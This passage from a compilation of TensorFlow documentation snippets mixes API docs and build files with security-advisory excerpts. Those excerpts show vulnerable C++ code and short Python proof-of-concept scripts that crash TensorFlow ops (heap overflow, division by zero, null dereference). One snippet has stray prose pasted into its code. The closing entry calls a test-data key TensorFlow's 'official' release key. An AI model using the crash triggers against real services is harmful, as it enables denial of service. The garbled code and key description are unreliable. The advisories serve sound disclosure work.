  lower_diag_index = diag_index.flat<int32>()(0);
```

----------------------------------------

TITLE: Identifying Vulnerable TensorFlow Control Flow Logic in C++
DESCRIPTION: Shows the specific C++ code block within TensorFlow's control flow graph processing that contains the null pointer vulnerability. It highlights the conditional check for `IsExit(curr_node)` where the code attempts to access `parent` (`parent_nodes[curr_id]`) without ensuring `parent` is non-null, causing a crash if the corresponding `Enter` node was missing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-175.md#_snippet_1

LANGUAGE: c++
CODE:
```
  ...
} else if (IsExit(curr_node)) {
  // Exit to the parent frame.
  parent = parent_nodes[curr_id];
  frame_name = cf_info->frame_names[parent->id()];
  ...
```

----------------------------------------

TITLE: Affected Calculation in TensorFlow QuantizedConv2D C++ Kernel
DESCRIPTION: This C++ snippet shows the lines in the `quantized_conv_ops.cc` kernel code where the calculation involving `filter_value_count` and `kMaxChunkSize` occurs. The division `kMaxChunkSize / (filter_value_count * sizeof(T1))` is vulnerable to a division by zero if `filter_value_count` is zero, which can happen with certain input filter shapes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-016.md#_snippet_1

LANGUAGE: c++
CODE:
```
const int filter_value_count = filter_width * filter_height * input_depth;
const int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));
```

----------------------------------------

TITLE: Output of Python Scalar Tracing Example - Text Output
DESCRIPTION: This is the output from the preceding Python code snippet, demonstrating the behavior of an `if` statement with a Python scalar condition. Only the `print` statement in the executed branch (`true branch`) is shown, confirming that the other branch was not executed or traced.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_11

LANGUAGE: text
CODE:
```
before if
true branch
after if
```

----------------------------------------

TITLE: Listing CPU Feature Guard APIs (C++)
DESCRIPTION: This snippet lists a C++ symbol from the CPU feature guard utility in the `//tensorflow/core/platform:cpu_feature_guard` build target. It provides information about unused CPU features.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_3

LANGUAGE: C++
CODE:
```
tensorflow::port::InfoAboutUnusedCPUFeatures
```

----------------------------------------

TITLE: Defining __eq__ method in Python
DESCRIPTION: Defines the equality check method for the class. This method is used to determine if two instances of the class are equal based on their content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifierOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Demonstrating TFSA-2022-115 Vulnerability in ParameterizedTruncatedNormal Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2022-115 vulnerability. It calls `tf.raw_ops.ParameterizedTruncatedNormal` with a `shape` tensor explicitly cast to `tf.int64`, which triggers the type mismatch `CHECK` failure, potentially causing a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-115.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
```

----------------------------------------

TITLE: Vulnerable Loop Accessing Arguments in C++
DESCRIPTION: This C++ snippet shows the specific code section within the `SpecializeType` function that contains the vulnerability. A typo results in accessing `t->mutable_args(i)` within a loop indexed by `j`, allowing out-of-bounds read/write access to the arguments vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-036.md#_snippet_0

LANGUAGE: cc
CODE:
```
for (int i = 0; i < op_def.output_arg_size(); i++) {
  // ...
  for (int j = 0; j < t->args_size(); j++) {
    auto* arg = t->mutable_args(i);
    // ...
  }
}
```

----------------------------------------

TITLE: Demonstrating Heap Buffer Overflow in MaxPool3DGradGrad (Python)
DESCRIPTION: This Python snippet provides a minimal example designed to trigger the heap buffer overflow vulnerability in `tf.raw_ops.MaxPool3DGradGrad`. It configures input tensors and pooling parameters that expose the flaw related to improper initialization error handling in the underlying C++ kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-064.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

values = [0.01] * 11
orig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.MaxPool3DGradGrad(
    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
    strides=strides, padding=padding)
```

----------------------------------------

TITLE: Demonstrating TFSA-2022-156 Vulnerability Setup using TFLite Python API
DESCRIPTION: This Python snippet demonstrates how to create a TensorFlow Lite model and interpreter configuration that is susceptible to the TFSA-2022-156 buffer overflow vulnerability. It defines a simple Keras model with a `Conv3DTranspose` layer and converts it to TFLite. Crucially, it initializes the TFLite interpreter using the `experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF`, which forces the use of the vulnerable reference kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-156.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
model = tf.keras.Sequential(
    [
        tf.keras.layers.InputLayer(input_shape=(2, 2, 2, 1024), batch_size=1),
        tf.keras.layers.Conv3DTranspose(
            filters=8,
            kernel_size=(2, 2, 2),
            padding="same",
            data_format="channels_last",
        ),
    ]
)

converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()

interpreter = tf.lite.Interpreter(
    model_content=tflite_model,
    experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF,
)

interpreter.allocate_tensors()
interpreter.set_tensor(
    interpreter.get_input_details()[0]["index"], tf.zeros(shape=[1, 2, 2, 2, 1024])
)
interpreter.invoke()
```

----------------------------------------

TITLE: Triggering SdcaOptimizer CHECK Fail (TensorFlow, Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger the vulnerability in `tf.raw_ops.SdcaOptimizer` by providing inputs such as `dense_features`, `example_state_data`, and others with a rank of 4 (e.g., `[5,5,5,3]`) instead of the expected rank 2. Executing this code on vulnerable TensorFlow versions will cause a `CHECK` failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-161.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SdcaOptimizer(
    sparse_example_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
    sparse_feature_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
    sparse_feature_values=8 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    dense_features=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    example_weights=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100), curiously this isn't a list
    example_labels=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
    sparse_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
    sparse_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    dense_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
    example_state_data=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100), curiously this isn't a list
    loss_type="squared_loss",
    l1=0.0,
    l2=0.0,
    num_loss_partitions=1,
    num_inner_iterations=1,
    adaptative=False,)
```

----------------------------------------

TITLE: Analyzing QuantizeV2 Shape Inference Axis Handling - C++
DESCRIPTION: This C++ snippet shows the vulnerable logic in TensorFlow's shape inference code for `QuantizeV2`. It attempts to retrieve the `axis` attribute and then uses it to merge dimensions (`c->Merge`) without validating that `axis` is within the valid range of input tensor dimensions, allowing negative values less than -1 to cause a heap out-of-bounds read. It relies on TensorFlow's internal shape inference context (`c`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-184.md#_snippet_1

LANGUAGE: cpp
CODE:
```
int axis = -1;
Status s = c->GetAttr("axis", &axis);
if (!s.ok() && s.code() != error::NOT_FOUND) {
  return s;
}
...
if (axis != -1) {
  ...
  TF_RETURN_IF_ERROR(
      c->Merge(c->Dim(minmax, 0), c->Dim(input, axis), &depth));
}
```

----------------------------------------

TITLE: Mac-Specific Python Dependency
DESCRIPTION: Specifies a dependency required only when building or running on macOS systems. This particular package manages SSL certificates.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_mac.txt#_snippet_0

LANGUAGE: Python Requirements
CODE:
```
certifi ~= 2022.12.07
```

----------------------------------------

TITLE: Setting Custom Dataset Flag Python
DESCRIPTION: Defines a boolean variable `use_custom_dataset` to control whether the notebook uses the default speech dataset or a user-provided custom dataset. This flag determines the subsequent data loading and preparation steps. It's often used in interactive notebooks to allow user configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
use_custom_dataset = False #@param ["False", "True"] {type:"raw"}
```

----------------------------------------

TITLE: Start Building BertTokenizerOptions using FlatBuffers in Python
DESCRIPTION: This function is part of the FlatBuffers Python API generated for the TFLite metadata schema. It is used to begin the construction of a `BertTokenizerOptions` FlatBuffer object. It requires a `FlatBufferBuilder` instance as input, which manages the buffer where the object data will be written.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BertTokenizerOptionsStart(
    builder
)
```

----------------------------------------

TITLE: Setting Output Shape in InferenceContext C++
DESCRIPTION: This C++ method, likely part of the `InferenceContext` class in TensorFlow, sets the `ShapeHandle` for a specific output index (`idx`) by writing to an internal vector (`outputs_`) using the `.at()` method. This is the location where the heap out-of-bounds write occurs if the provided index `idx` is outside the valid bounds of the `outputs_` vector, as exploited by the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-032.md#_snippet_1

LANGUAGE: C++
CODE:
```
void set_output(int idx, ShapeHandle shape) { outputs_.at(idx) = shape; }
```

----------------------------------------

TITLE: Allocating std::vector in TensorFlow Shape Inference (C++)
DESCRIPTION: This snippet shows the code path in TensorFlow's shape inference where a `std::vector` is allocated. The size `num_dims` is derived from `shape_dim`, which can be controlled by user-provided tensors, leading to potential integer overflow and allocation of an extremely large vector, causing a crash. This is the core vulnerability identified in TFSA-2022-042.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-042.md#_snippet_0

LANGUAGE: C++
CODE:
```
  const auto num_dims = Value(shape_dim);
  std::vector<DimensionHandle> dims;
  dims.reserve(num_dims);
```

----------------------------------------

TITLE: Accessing Index Value in TensorFlow StagePeek Kernel C++
DESCRIPTION: This C++ code fragment is taken from the implementation of the `StagePeek` operation kernel. It attempts to extract the input tensor at index 0 and access its value as a scalar integer using `scalar<int>()()`. This line is the source of the vulnerability because it assumes the input is a scalar without validating its shape, leading to a crash if a non-scalar tensor is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-065.md#_snippet_1

LANGUAGE: cpp
CODE:
```
std::size_t index = ctx->input(0).scalar<int>()();
```

----------------------------------------

TITLE: Initializing Bert Tokenizer Vocab File Vector (Python)
DESCRIPTION: This function is a helper generated from the FlatBuffers schema. It is used internally during the process of building a FlatBuffers message for `BertTokenizerOptions`. It signals the start of a vector (array) that will contain entries related to the vocabulary file, preparing the FlatBuffers builder to append elements to this vector. It requires a FlatBuffers builder instance and the expected number of elements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsStartVocabFileVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BertTokenizerOptionsStartVocabFileVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Comparing ModelHParams Greater Than or Equal To - Python
DESCRIPTION: Performs a greater than or equal to comparison between this `ModelHParams` instance and another object. This method is typically generated automatically by attribute libraries like `attrs` for ordered comparisons.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_2

LANGUAGE: Python
CODE:
```
__ge__(
    other
)
```

----------------------------------------

TITLE: Processing MLIR Function Attributes in C++
DESCRIPTION: This C++ snippet shows the loop within `mlir::tfg::ConvertGenericFunctionToFunctionDef` that iterates through MLIR function attributes. It attempts to convert attribute values and append them to a list with a "tf." prefix. The vulnerability arises here: if `namedAttr.first` (the attribute name) is an empty string, accessing it leads to a null dereference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-137.md#_snippet_0

LANGUAGE: C++
CODE:
```
// Import the function attributes with a `tf.` prefix to match the current
// infrastructure expectations.
for (const auto& namedAttr : func.attr()) {
  const std::string& name = "tf." + namedAttr.first;
  const AttrValue& tf_attr = namedAttr.second;
  TF_ASSIGN_OR_RETURN(Attribute attr,
                      ConvertAttributeValue(tf_attr, builder, tfgDialect));
  attrs.append(name, attr);
}
```

----------------------------------------

TITLE: Setting Up CMake Project and Source Directory
DESCRIPTION: Defines the project name and language, sets a cache variable for the farmhash source directory, and enforces that the directory must be specified, terminating with an error if it's not found.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/farmhash/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
project(farmhash CXX)

set(FARMHASH_SOURCE_DIR "" CACHE PATH
  "Directory that contains the farmhash project"
)
if(NOT FARMHASH_SOURCE_DIR)
  message(FATAL_ERROR "Must specify source directory")
endif()
```

----------------------------------------

TITLE: Getting Root ScoreCalibrationOptions from Buffer - TFLite Metadata Python (Deprecated)
DESCRIPTION: This deprecated class method initializes and returns the root `ScoreCalibrationOptions` object from the provided buffer (`buf`) at a specific offset. Users are advised to use the more generic `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptions.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsScoreCalibrationOptions(
    buf, offset=0
)

```

----------------------------------------

TITLE: Lowering tf.Split to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.Split` operation, which splits a tensor into multiple tensors along a specified dimension, to the TOSA dialect's `lower_split_op`. It requires the split dimension as a constant and the number of splits.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_36

LANGUAGE: MLIR
CODE:
```
%output = tf.Split(%split_dim, %value) {num_split}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_split_op(%value, %split_dim.as_constant(), num_split)
```

----------------------------------------

TITLE: Calling tflite_support.metadata_schema_py_generated.CustomMetadataAddData in Python
DESCRIPTION: This Python snippet shows the basic signature for calling the `CustomMetadataAddData` function. It takes a FlatBuffers `builder` object and the `data` to be added as custom metadata. This function is typically used internally during the construction of TFLite model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataAddData.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.CustomMetadataAddData(
    builder, data
)
```

----------------------------------------

TITLE: Calculating TFLite SpaceToDepth Output Dimensions (Vulnerable)
DESCRIPTION: This C++ snippet from the TFLite `SpaceToDepth` operator's `Prepare` function shows how output dimensions are calculated based on input dimensions and a `block_size`. The vulnerability lies here, as there is no check to prevent division by zero if `params->block_size` is zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-075.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int block_size = params->block_size;
const int input_height = input->dims->data[1];
const int input_width = input->dims->data[2];
int output_height = input_height / block_size;
int output_width = input_width / block_size;
```

----------------------------------------

TITLE: Vulnerable Check in TFLite BiasAndClamp C++
DESCRIPTION: This C++ code snippet shows the `BiasAndClamp` function from TFLite kernels. It includes a `TFLITE_DCHECK_EQ` assertion that performs a modulo operation using `bias_size`. The vulnerability arises because there is no check to ensure `bias_size` is non-zero before this operation, potentially leading to a division-by-zero error if `bias_size` is 0.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-021.md#_snippet_0

LANGUAGE: C++
CODE:
```
inline void BiasAndClamp(float clamp_min, float clamp_max, int bias_size,
                         const float* bias_data, int array_size,
                         float* array_data) {
  // ...
  TFLITE_DCHECK_EQ((array_size % bias_size), 0);
  // ...
}
```

----------------------------------------

TITLE: Triggering Division by Zero in FractionalAvgPool (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in TensorFlow's `tf.raw_ops.FractionalAvgPool`. It uses a specific `pooling_ratio` value that, when combined with the input `value` shape, causes an internal output size calculation to result in zero, leading to a crash later in the operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-038.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

value = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)
pooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]
pseudo_random = False
overlapping = False
deterministic = False
seed = 0
seed2 = 0

tf.raw_ops.FractionalAvgPool(
  value=value, pooling_ratio=pooling_ratio, pseudo_random=pseudo_random,
  overlapping=overlapping, deterministic=deterministic, seed=seed, seed2=seed2)
```

----------------------------------------

TITLE: Check Disk Space - Shell
DESCRIPTION: Displays the available disk space on mounted file systems. This is a common step in build environments to ensure there is sufficient space for build artifacts and temporary files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_16

LANGUAGE: Shell
CODE:
```
df -h
```

----------------------------------------

TITLE: Specifying Dependency - numpy - Requirements
DESCRIPTION: Defines the dependency on the numpy package, pinning it to version 1.24.3. Multiple SHA256 hashes are provided to verify the integrity of the downloaded package files, ensuring that the installed package matches one of the trusted sources.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/requirements_lock_3_11.txt#_snippet_0

LANGUAGE: Requirements
CODE:
```
numpy==1.24.3 \
  --hash=sha256:0ec87a7084caa559c36e0a2309e4ecb1baa03b687201d0a847c8b0ed476a7187 \
  --hash=sha256:1a7d6acc2e7524c9955e5c903160aa4ea083736fde7e91276b0e5d98e6332812 \
  --hash=sha256:202de8f38fc4a45a3eea4b63e2f376e5f2dc64ef0fa692838e31a808520efaf7 \
  --hash=sha256:210461d87fb02a84ef243cac5e814aad2b7f4be953b32cb53327bb49fd77fbb4 \
  --hash=sha256:2d926b52ba1367f9acb76b0df6ed21f0b16a1ad87c6720a1121674e5cf63e2b6 \
  --hash=sha256:352ee00c7f8387b44d19f4cada524586f07379c0d49270f87233983bc5087ca0 \
  --hash=sha256:35400e6a8d102fd07c71ed7dcadd9eb62ee9a6e84ec159bd48c28235bbb0f8e4 \
  --hash=sha256:3c1104d3c036fb81ab923f507536daedc718d0ad5a8707c6061cdfd6d184e570 \
  --hash=sha256:4719d5aefb5189f50887773699eaf94e7d1e02bf36c1a9d353d9f46703758ca4 \
  --hash=sha256:4749e053a29364d3452c034827102ee100986903263e89884922ef01a0a6fd2f \
  --hash=sha256:5342cf6aad47943286afa6f1609cad9b4266a05e7f2ec408e2cf7aea7ff69d80 \
  --hash=sha256:56e48aec79ae238f6e4395886b5eaed058abb7231fb3361ddd7bfdf4eed54289 \
  --hash=sha256:76e3f4e85fc5d4fd311f6e9b794d0c00e7002ec122be271f2019d63376f1d385 \
  --hash=sha256:7776ea65423ca6a15255ba1872d82d207bd1e09f6d0894ee4a64678dd2204078 \
  --hash=sha256:784c6da1a07818491b0ffd63c6bbe5a33deaa0e25a20e1b3ea20cf0e43f8046c \
  --hash=sha256:8535303847b89aa6b0f00aa1dc62867b5a32923e4d1681a35b5eef2d9591a463 \
  --hash=sha256:9a7721ec204d3a237225db3e194c25268faf92e19338a35f3a224469cb6039a3 \
  --hash=sha256:a1d3c026f57ceaad42f8231305d4653d5f05dc6332a730ae5c0bea3513de0950 \
  --hash=sha256:ab344f1bf21f140adab8e47fdbc7c35a477dc01408791f8ba00d018dd0bc5155 \
  --hash=sha256:ab5f23af8c16022663a652d3b25dcdc272ac3f83c3af4c02eb8b824e6b3ab9d7 \
  --hash=sha256:ae8d0be48d1b6ed82588934aaaa179875e7dc4f3d84da18d7eae6eb3f06c242c \
  --hash=sha256:c91c4afd8abc3908e00a44b2672718905b8611503f7ff87390cc0ac3423fb096 \
  --hash=sha256:d5036197ecae68d7f491fcdb4df90082b0d4960ca6599ba2659957aafced7c17 \
  --hash=sha256:d6cc757de514c00b24ae8cf5c876af2a7c3df189028d68c0cb4eaa9cd5afc2bf \
  --hash=sha256:d933fabd8f6a319e8530d0de4fcc2e6a61917e0b0c271fded460032db42a0fe4 \
  --hash=sha256:ea8282b9bcfe2b5e7d491d0bf7f3e2da29700cec05b49e64d6246923329f2b02 \
  --hash=sha256:ecde0f8adef7dfdec993fd54b0f78183051b6580f606111a6d789cd14c61ea0c \
  --hash=sha256:f21c442fdd2805e91799fbe044a7b999b8571bb0ab0f7850d0cb9641a687092b
```

----------------------------------------

TITLE: Set CMake Policy CMP0116
DESCRIPTION: Sets CMake policy CMP0116 to OLD, which affects how Ninja generators handle DEPFILEs from add_custom_command(). This maintains compatibility with older behavior for DEPFILEs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
# CMP0116: Ninja generators transform `DEPFILE`s from `add_custom_command()`
# New in CMake 3.20. https://cmake.org/cmake/help/latest/policy/CMP0116.html
if(POLICY CMP0116)
  cmake_policy(SET CMP0116 OLD)
endif()
```

----------------------------------------

TITLE: Getting Root Stats Object (Deprecated) in Python
DESCRIPTION: This class method is a deprecated way to retrieve the root `Stats` object from a FlatBuffers buffer. Users are advised to switch to the `GetRootAs` method for current implementations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAsStats(
    buf, offset=0
)
```

----------------------------------------

TITLE: Listing DTensor Device APIs (C++)
DESCRIPTION: This snippet lists C++ symbols for DTensor device management and operations, exposed by the `//tensorflow/dtensor/cc:dtensor_device_cc` build target. It includes functions for device allocation, mesh management, layout setting, TPU core ID mapping, packing, unpacking, and stats.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_10

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::AllocateDTensorDevice
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::AddMesh
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::ExperimentalSetDefaultLayout
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::ExperimentalClearDefaultLayout
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::ExperimentalSetDefaultMesh
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::ExperimentalClearDefaultMesh
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::SetTPUCoreIDs
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::ClearTPUCoreIDs
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::TPUCoreIDsToLocations
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::TPUCoreLocationsToIDs
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::Pack
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::Unpack
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::FetchLayout
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::IsDTensor
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::SparsePack
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::IsSparseDTensor
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::GetStats
```

LANGUAGE: C++
CODE:
```
tensorflow::dtensor::SetIteratorElementLayouts
```

----------------------------------------

TITLE: Demonstrating TensorFlow Null Pointer Exploit in Python
DESCRIPTION: Provides a minimal Python example to trigger the TFSA-2021-175 vulnerability. It defines a TensorFlow function that directly calls `tf.raw_ops.Exit` without the necessary preceding `Enter` node, demonstrating how this specific operation can lead to the null pointer exception and crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-175.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.Exit(data=[False,False])

func()
```

----------------------------------------

TITLE: Looping through TFLite Strided Slice dimensions (C++)
DESCRIPTION: This C++ code snippet shows the vulnerable loop structure within the TFLite strided slice kernel. The loop iterates through effective dimensions, handling ellipsis masks. The vulnerability arises if the inner loop's termination condition (`i < ellipsis_end_idx`) is never met because `ellipsis_end_idx` is less than or equal to `i`, combined with the `continue` statement skipping the outer loop's increment, leading to an infinite loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-159.md#_snippet_0

LANGUAGE: cc
CODE:
```
  for (int i = 0; i < effective_dims;) {
    if ((1 << i) & op_context->params->ellipsis_mask) {
      // ...
      int ellipsis_end_idx =
          std::min(i + 1 + num_add_axis + op_context->input_dims - begin_count,
                   effective_dims);
      // ...
      for (; i < ellipsis_end_idx; ++i) {
        // ...
      }
      continue;
    }
    // ...
    ++i;
  }
```

----------------------------------------

TITLE: Calling quantize_and_dequantize with invalid axis (Python)
DESCRIPTION: Demonstrates calling `tf.quantization.quantize_and_dequantize` in Python with an invalid `axis` value (`10`), which exceeds the rank of the input tensor and is used to trigger the reported segfault vulnerability. It shows the specific parameters used in the exploit example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-027.md#_snippet_0

LANGUAGE: Python
CODE:
```
tf.quantization.quantize_and_dequantize(
    input=[2.5, 2.5], input_min=[0,0], input_max=[1,1], axis=10
)
```

----------------------------------------

TITLE: Create TensorMetadata From Buffer (Deprecated) - Class Method (Python)
DESCRIPTION: This class method is deprecated; use GetRootAs instead. It initializes and returns a TensorMetadata object from a FlatBuffers buffer, taking the buffer and an optional offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_9

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsTensorMetadata(
    buf, offset=0
)
```

----------------------------------------

TITLE: Training Output for TensorFlow Model (None)
DESCRIPTION: Displays the console output resulting from executing the TensorFlow model training code. It shows the target offset value and the value predicted by the trained model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_1

LANGUAGE: none
CODE:
```
The actual offset is: 1.0
The predicted offset is: 0.99999905
```

----------------------------------------

TITLE: TensorFlow RSA Public Key PEM Block
DESCRIPTION: This snippet contains the official RSA public key for the TensorFlow project, encoded in PEM format. It is used by users and tools to verify the authenticity and integrity of TensorFlow releases, commits, or other artifacts signed with the corresponding private key.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/tsl/platform/cloud/testdata/service_account_public_key.txt#_snippet_0

LANGUAGE: PEM
CODE:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwrEZE6PWQYAy68mWPMuC
6KAD02Sb9Pv/FHWpGKe8MxxdDiz/spb2KIrWxxZolStHgDXAOoElbAv4GbRLJiiv
El8k0gSP9YpIE56nSxfXxRIDH25NI3fhRIs5hSG+/p3lLV5NsdNrm1CYHnEbTY7O
w7gpyxl0n+6q+ngguZTOGtBIMqVS4KIJlzTlJgeqvLFbtLP6uFc4OuGL6UZ+s4I7
zSJVPBRxrFA+mOhBEPz/QjANBHBdIEhgh5VlmX/oRUK+D3zR/MnRTYtD8skiZSFM
Uix1eWvKw/1wX0mieH1rUQbpIYdJTgFhROKuAJWVU7c+T6JHZwm8DqXaVz6oCJPl
zwIDAQAB
